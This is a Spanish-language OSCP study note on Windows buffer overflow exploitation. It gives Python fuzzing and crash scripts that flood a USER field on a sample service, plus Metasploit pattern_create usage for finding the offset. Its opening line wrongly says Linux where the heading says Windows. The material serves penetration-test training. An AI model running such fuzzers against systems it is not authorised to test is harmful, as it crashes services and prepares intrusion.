# Apuntes de Preparación para el OSCP

![OSCP Image](http://funkyimg.com/i/2MPB4.png)
#### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet

## Índice y Estructura Principal
- [Buffer Overflow Windows (25 puntos)](#Buffer-Overflow-Windows)

Buffer Overflow Windows
===============================================================================================================================
A continuación, se listan los pasos a seguir para la correcta explotación de Buffer Overflow en Linux (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.

Servicios/Máquinas con los que practicar:

-   SLMail 5.5 
-   Minishare 1.4.1
-   Máquina Brainpan de VulnHub
-   Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio

Generalmente, la metodología a seguir es la siguiente:

-   Fuzzing

Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = ["A"]
ipAddress = sys.argv[1]

port = 4000
contador = 100

while len(buffer) < 30:
  buffer.append("A"*contador)
  contador += 200
  
for strings in buffer:
  try:
    print "Enviando %s bytes..." % len(strings)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    s.send("USER " + strings + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print "\nError de conexión...\n"
    sys.exit(0)

```
De esta forma, a través de una lista, vamos almacenando en la variable **buffer** el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. 

Esto es:

**[1 caracter "A", 100 caracteres "A", 300 caracteres "A", 500 caracteres "A", 700 caracteres "A", ...]**

Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.

Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.

Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue **"Enviando 700 bytes..."**, lo conveniente es modificar nuestro script al siguiente contenido:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*900
ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, **Immunity Debugger** directamente nos debería reportar la violación de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximación de tamaño del buffer permitido.

-   Calculando el Offset [Tamaño del Búffer]

Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qué tamaño tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.

La funcionalidad **pattern_create** nos permitirá generar un puñado de caracteres aleatorios en base a una longitud fijada como criterio. 

Ejemplo:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```


